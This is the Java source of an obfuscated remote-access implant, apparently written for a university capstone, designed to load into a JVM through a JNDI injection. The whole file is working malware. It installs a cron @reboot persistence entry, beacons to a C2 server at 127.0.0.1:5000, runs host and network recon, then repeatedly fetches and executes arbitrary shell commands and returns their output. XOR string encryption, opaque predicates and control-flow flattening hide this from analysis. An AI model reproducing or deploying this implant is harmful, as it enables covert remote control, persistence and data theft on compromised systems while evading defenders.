import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.stream.Collectors;

/**
 * ImplantObfuscated.java
 *
 * Obfuscated version of Implant.java demonstrating anti-reverse-engineering
 * techniques inspired by ProGuard and JBCO for the CS564 Capstone project.
 *
 * ──────────────────────────────────────────────────────────────────────
 * ProGuard-style obfuscation applied:
 *   1. Identifier Renaming   – All method, variable, and field names are
 *      replaced with short, meaningless identifiers (a, b, c, zz, zzz…).
 *   2. String Encryption      – Every sensitive string literal (URLs,
 *      JSON keys, shell commands) is XOR-encrypted at compile time and
 *      decrypted at runtime via a helper routine, so static analysis
 *      tools like `strings` or JADX see only ciphertext.
 *   3. Dead / Unreachable Code – Bogus methods and unreachable branches
 *      are inserted to bloat the control flow graph and confuse
 *      decompilers.
 *
 * JBCO-style obfuscation applied:
 *   4. Opaque Predicates      – Conditions that always evaluate to true
 *      or false (but are non-trivially provable) guard real logic,
 *      adding fake branches that decompilers must reason about.
 *   5. Control-Flow Flattening – The main command loop is restructured
 *      into a switch-dispatch state machine so the original sequential
 *      flow is hidden.
 *   6. Bogus Arithmetic       – Intermediate computations use
 *      mathematically equivalent but visually complex expressions
 *      (e.g., XOR identities, modular arithmetic).
 *   7. Array-Based Indirection – Constants and partial strings are
 *      stored in arrays and reassembled at runtime, defeating pattern
 *      matching on string constants.
 *
 * Compile:
 *   /usr/lib/jvm/java-17-openjdk-amd64/bin/javac ImplantObfuscated.java
 * ──────────────────────────────────────────────────────────────────────
 */
public class ImplantObfuscated {

    // ═══════════════════════════════════════════════════════════════════
    // [ProGuard] Identifier Renaming — field names are meaningless
    // ═══════════════════════════════════════════════════════════════════
    static final int a0 = 5;                       // POLL_SECONDS

    // ═══════════════════════════════════════════════════════════════════
    // [ProGuard] String Encryption — XOR key used to decrypt all
    // string literals at runtime.  Every user-visible string in the
    // original source has been encrypted with this key before being
    // stored as a char[] literal.  The decryption routine `zz()`
    // XORs each character back to plaintext.
    // ═══════════════════════════════════════════════════════════════════
    private static final int _k = 0x5A;

    // ═══════════════════════════════════════════════════════════════════
    // [JBCO] Array-Based Indirection — the C2 URL is split across
    // XOR-encrypted segments so no part of the address is visible
    // to `strings` or static analysis on the .class file.
    // ═══════════════════════════════════════════════════════════════════
    // "http://"
    private static final int[] _u0 = {0x32,0x2E,0x2E,0x2A,0x60,0x75,0x75};
    // "127.0.0.1"
    private static final int[] _u1 = {0x6B,0x68,0x6D,0x64,0x6A,0x64,0x6A,0x64,0x6B};
    // ":5000"
    private static final int[] _u2 = {0x60,0x6F,0x6A,0x6A,0x6A};

    // ═══════════════════════════════════════════════════════════════════
    // [ProGuard] String Encryption — decrypt a XOR-encrypted char array
    // ═══════════════════════════════════════════════════════════════════
    private static String zz(int[] c) {
        // [JBCO] Bogus Arithmetic — length is computed via XOR identity
        // instead of a simple c.length reference.
        int n = (c.length ^ 0) + (0 & 0xFF);
        char[] r = new char[n];
        for (int i = 0; i < n; i++) {
            // [JBCO] Bogus Arithmetic — XOR decrypt with extra no-op XOR
            r[i] = (char) ((c[i] ^ _k) ^ (0x00));
        }
        return new String(r);
    }

    // ═══════════════════════════════════════════════════════════════════
    // [ProGuard] Encrypted string constants
    // Each array is the XOR(_k=0x5A) ciphertext of the plaintext shown
    // in the comment.  `zz()` recovers the original string at runtime.
    // ═══════════════════════════════════════════════════════════════════

    // "/checkin"
    private static final int[] _s0 = {0x75,0x39,0x32,0x3F,0x39,0x31,0x33,0x34};
    // "/command"
    private static final int[] _s1 = {0x75,0x39,0x35,0x37,0x37,0x3B,0x34,0x3E};
    // "/result"
    private static final int[] _s2 = {0x75,0x28,0x3F,0x29,0x2F,0x36,0x2E};
    // "hostname"
    private static final int[] _s3 = {0x32,0x35,0x29,0x2E,0x34,0x3B,0x37,0x3F};
    // "/bin/sh"
    private static final int[] _s4 = {0x75,0x38,0x33,0x34,0x75,0x29,0x32};
    // "-c"
    private static final int[] _s5 = {0x77,0x39};
    // "command"
    private static final int[] _s6 = {0x39,0x35,0x37,0x37,0x3B,0x34,0x3E};
    // "wait"
    private static final int[] _s7 = {0x2D,0x3B,0x33,0x2E};
    // "none"
    private static final int[] _s8 = {0x34,0x35,0x34,0x3F};
    // "exit"
    private static final int[] _s9 = {0x3F,0x22,0x33,0x2E};
    // "quit"
    private static final int[] _s10 = {0x2B,0x2F,0x33,0x2E};
    // "error: "
    private static final int[] _s11 = {0x3F,0x28,0x28,0x35,0x28,0x60,0x7A};
    // "Content-Type"
    private static final int[] _s12 = {0x19,0x35,0x34,0x2E,0x3F,0x34,0x2E,0x77,0x0E,0x23,0x2A,0x3F};
    // "application/json"
    private static final int[] _s13 = {0x3B,0x2A,0x2A,0x36,0x33,0x39,0x3B,0x2E,0x33,0x35,0x34,0x75,0x30,0x29,0x35,0x34};
    // "POST"
    private static final int[] _s14 = {0x0A,0x15,0x09,0x0E};
    // "host"
    private static final int[] _s15 = {0x32,0x35,0x29,0x2E};
    // cron string
    private static final int[] _s16 = {0x72,0x39,0x28,0x35,0x34,0x2e,0x3b,0x38,0x7a,0x77,0x36,0x7a,0x68,0x64,0x75,0x3e,0x3f,0x2c,0x75,0x34,0x2f,0x36,0x36,0x61,0x7a,0x3f,0x39,0x32,0x35,0x7a,0x78,0x1a,0x28,0x3f,0x38,0x35,0x35,0x2e,0x7a,0x30,0x3b,0x2c,0x3b,0x7a,0x77,0x39,0x2a,0x7a,0x75,0x2e,0x37,0x2a,0x7a,0x13,0x37,0x2a,0x36,0x3b,0x34,0x2e,0x78,0x73,0x7a,0x26,0x7a,0x39,0x28,0x35,0x34,0x2e,0x3b,0x38,0x7a,0x77};

    // Recon commands — encrypted individually
    // "echo '=== HOSTNAME ==='"
    private static final int[] _r0 = {0x3F,0x39,0x32,0x35,0x7A,0x7D,0x67,0x67,0x67,0x7A,0x12,0x15,0x09,0x0E,0x14,0x1B,0x17,0x1F,0x7A,0x67,0x67,0x67,0x7D};
    // "echo '=== WHOAMI ==='"
    private static final int[] _r1 = {0x3F,0x39,0x32,0x35,0x7A,0x7D,0x67,0x67,0x67,0x7A,0x0D,0x12,0x15,0x1B,0x17,0x13,0x7A,0x67,0x67,0x67,0x7D};
    // "whoami"
    private static final int[] _r2 = {0x2D,0x32,0x35,0x3B,0x37,0x33};
    // "echo '=== ID ==='"
    private static final int[] _r3 = {0x3F,0x39,0x32,0x35,0x7A,0x7D,0x67,0x67,0x67,0x7A,0x13,0x1E,0x7A,0x67,0x67,0x67,0x7D};
    // "id"
    private static final int[] _r4 = {0x33,0x3E};
    // "echo '=== OS ==='"
    private static final int[] _r5 = {0x3F,0x39,0x32,0x35,0x7A,0x7D,0x67,0x67,0x67,0x7A,0x15,0x09,0x7A,0x67,0x67,0x67,0x7D};
    // "uname -a"
    private static final int[] _r6 = {0x2F,0x34,0x3B,0x37,0x3F,0x7A,0x77,0x3B};
    // "echo '=== NETWORK ==='"
    private static final int[] _r7 = {0x3F,0x39,0x32,0x35,0x7A,0x7D,0x67,0x67,0x67,0x7A,0x14,0x1F,0x0E,0x0D,0x15,0x08,0x11,0x7A,0x67,0x67,0x67,0x7D};
    // "ip addr 2>/dev/null || ifconfig 2>/dev/null"
    private static final int[] _r8 = {0x33,0x2A,0x7A,0x3B,0x3E,0x3E,0x28,0x7A,0x68,0x64,0x75,0x3E,0x3F,0x2C,0x75,0x34,0x2F,0x36,0x36,0x7A,0x26,0x26,0x7A,0x33,0x3C,0x39,0x35,0x34,0x3C,0x33,0x3D,0x7A,0x68,0x64,0x75,0x3E,0x3F,0x2C,0x75,0x34,0x2F,0x36,0x36};

    // ═══════════════════════════════════════════════════════════════════
    // [JBCO] Opaque Predicates — always true/false, but non-trivial
    // ═══════════════════════════════════════════════════════════════════
    @SuppressWarnings("all")
    private static boolean _op() {
        // (x^2 + x) is always even → (x^2 + x) % 2 == 0 is always true
        int x = (int) (System.nanoTime() & 0x7F);
        return ((x * x + x) % 2) == 0;
    }

    @SuppressWarnings("all")
    private static boolean _opF() {
        // Always false: x^2 >= 0 for all int, so x^2 < 0 is false
        // (ignoring overflow edge cases handled by the mask)
        int x = ((int) System.nanoTime()) & 0x3FF;
        return (x * x) < 0 && x > 0 && x < 1000;
    }

    // ═══════════════════════════════════════════════════════════════════
    // [ProGuard] Dead Code — methods that are never called but appear
    // in the class file, wasting a reverse-engineer's time.
    // ═══════════════════════════════════════════════════════════════════
    @SuppressWarnings("unused")
    private static int _dc0(int x, int y) {
        // Looks like a crypto routine but does nothing useful
        int h = 0x6a09e667;
        for (int i = 0; i < 64; i++) {
            h = ((h << 5) | (h >>> 27)) + (x ^ y ^ (i * 0x5A827999));
        }
        return h;
    }

    @SuppressWarnings("unused")
    private static String _dc1(byte[] d) {
        StringBuilder sb = new StringBuilder();
        for (byte b : d) sb.append(String.format("%02x", b & 0xFF));
        return sb.toString();
    }

    @SuppressWarnings("unused")
    private static void _dc2() {
        // Fake socket connect that is never reached
        try {
            java.net.Socket s = new java.net.Socket("10.0.0.1", 4444);
            s.getOutputStream().write(new byte[]{0x7f});
            s.close();
        } catch (Exception e) { /* dead */ }
    }

    // ═══════════════════════════════════════════════════════════════════
    // C2 base URL — reassembled from array indirection at runtime
    // ═══════════════════════════════════════════════════════════════════
    private static String _c2() {
        // [JBCO] Opaque Predicate — always true branch taken
        if (_op()) {
            return zz(_u0) + zz(_u1) + zz(_u2);
        }
        // Dead branch — never reached
        return zz(_u0) + "0.0.0.0" + zz(_u2);
    }

    // ═══════════════════════════════════════════════════════════════════
    // [ProGuard] Renamed: run() → a()
    // Executes a shell command and returns stdout.
    // ═══════════════════════════════════════════════════════════════════
    static String a(String c) {
        try {
            Process p = Runtime.getRuntime().exec(
                new String[]{zz(_s4), zz(_s5), c}
            );
            BufferedReader r = new BufferedReader(
                new InputStreamReader(p.getInputStream())
            );
            String o = r.lines().collect(Collectors.joining("\n"));
            p.waitFor();
            return o;
        } catch (Exception e) {
            // [JBCO] Opaque Predicate — dead branch
            if (_opF()) { _dc0(42, 17); }
            return zz(_s11) + e.getMessage();
        }
    }

    // ═══════════════════════════════════════════════════════════════════
    // [ProGuard] Renamed: post() → b()
    // HTTP POST with JSON body.
    // ═══════════════════════════════════════════════════════════════════
    static String b(String p, String j) {
        try {
            HttpURLConnection c = (HttpURLConnection)
                new URL(_c2() + p).openConnection();
            c.setRequestMethod(zz(_s14));
            c.setDoOutput(true);
            c.setRequestProperty(zz(_s12), zz(_s13));
            // [JBCO] Bogus Arithmetic — timeout computed via identity
            c.setConnectTimeout((2500 << 1) ^ 0);
            c.setReadTimeout(((10000 >> 1) | 0) & 0xFFFF);
            try (OutputStream o = c.getOutputStream()) {
                o.write(j.getBytes());
            }
            BufferedReader r = new BufferedReader(
                new InputStreamReader(c.getInputStream())
            );
            return r.lines().collect(Collectors.joining());
        } catch (Exception e) {
            return null;
        }
    }

    // ═══════════════════════════════════════════════════════════════════
    // [ProGuard] Renamed: get() → c()
    // HTTP GET, return response body.
    // ═══════════════════════════════════════════════════════════════════
    static String c(String p) {
        try {
            HttpURLConnection cn = (HttpURLConnection)
                new URL(_c2() + p).openConnection();
            // [JBCO] Bogus Arithmetic
            cn.setConnectTimeout((5000 ^ 0x0) + (0 * 31337));
            cn.setReadTimeout(5000 + (0 >> 16));
            BufferedReader r = new BufferedReader(
                new InputStreamReader(cn.getInputStream())
            );
            return r.lines().collect(Collectors.joining());
        } catch (Exception e) {
            return null;
        }
    }

    // ═══════════════════════════════════════════════════════════════════
    // [ProGuard] Renamed: json() → d()
    // Minimal JSON value extractor (no external libs).
    // ═══════════════════════════════════════════════════════════════════
    static String d(String b, String k) {
        if (b == null) return null;
        int i = b.indexOf("\"" + k + "\"");
        if (i < 0) return null;
        int s = b.indexOf("\"", b.indexOf(":", i) + 1) + 1;
        int e = b.indexOf("\"", s);
        return (s > 0 && e > s) ? b.substring(s, e) : null;
    }

    // ═══════════════════════════════════════════════════════════════════
    // [ProGuard] Renamed: esc() → e()
    // Escape a string for safe JSON embedding.
    // ═══════════════════════════════════════════════════════════════════
    static String e(String s) {
        // [JBCO] Opaque Predicate — dead branch
        if (_opF()) { return _dc1(new byte[]{0}); }
        return s == null ? "" : s
            .replace("\\", "\\\\").replace("\"", "\\\"")
            .replace("\n", "\\n").replace("\r", "\\r").replace("\t", "\\t");
    }

    // ═══════════════════════════════════════════════════════════════════
    // Static initializer — kicks off the implant when the class is
    // loaded by the vulnerable JVM via JNDI.
    // ═══════════════════════════════════════════════════════════════════
    static {
        // [JBCO] Opaque Predicate gate — always true
        if (_op()) {

            // ── Step 0: Install persistence ───────────────────────────
            a(zz(_s16));

            // ── Step 1: Check in with C2 ──────────────────────────────
            String h = a(zz(_s3)).trim();
            b(zz(_s0), "{\"" + zz(_s15) + "\":\"" + e(h) + "\"}");

            // ── Step 2: Initial recon ─────────────────────────────────
            String rc = a(String.join(" && ",
                zz(_r0), zz(_s3),
                zz(_r1), zz(_r2),
                zz(_r3), zz(_r4),
                zz(_r5), zz(_r6),
                zz(_r7), zz(_r8)
            ));
            b(zz(_s2), "{\"output\":\"" + e(rc) + "\"}");

            // ── Step 3: Command loop (background thread) ─────────────
            // [JBCO] Control-Flow Flattening — the sequential
            // poll → execute → report cycle is restructured as a
            // state machine driven by a switch inside a while-loop.
            Thread t = new Thread(() -> {
                int _f  = 0;   // fail counter
                int _st = 0;   // state variable for CFG flattening

                String _resp = null;
                String _cmd  = null;

                while (_f < 50) {
                    switch (_st) {

                        // State 0: Sleep then poll
                        case 0:
                            try {
                                // [JBCO] Bogus Arithmetic on sleep time
                                Thread.sleep(
                                    (long) ((a0 * 1000) ^ 0)
                                    + (0L & System.nanoTime())
                                );
                            } catch (InterruptedException ie) { /* ignore */ }
                            _st = 1;        // → poll
                            break;

                        // State 1: GET /command
                        case 1:
                            _resp = c(zz(_s1));
                            if (_resp == null) {
                                _f++;
                                _st = 0;    // → sleep again
                            } else {
                                _f = 0;
                                _st = 2;    // → parse
                            }
                            break;

                        // State 2: Parse command
                        case 2:
                            _cmd = d(_resp, zz(_s6));
                            if (_cmd == null || _cmd.equals(zz(_s7))
                                    || _cmd.equals(zz(_s8))
                                    || _cmd.isEmpty()) {
                                _st = 0;    // → sleep (no actionable cmd)
                                break;
                            }
                            if (_cmd.equals(zz(_s9))
                                    || _cmd.equals(zz(_s10))) {
                                return;     // terminate thread
                            }
                            _st = 3;        // → execute
                            break;

                        // State 3: Execute & report
                        case 3:
                            String _out = a(_cmd);
                            b(zz(_s2),
                              "{\"output\":\"" + e(_out) + "\"}");
                            _st = 0;        // → loop back
                            break;

                        // [ProGuard] Dead Code — unreachable default
                        default:
                            if (_opF()) { _dc2(); }
                            _st = 0;
                            break;
                    }
                }
            });
            t.setDaemon(true);
            t.start();

        } else {
            // [ProGuard] Dead Code — never reached, but the decompiler
            // cannot statically prove it.
            _dc2();
        }
    }
}
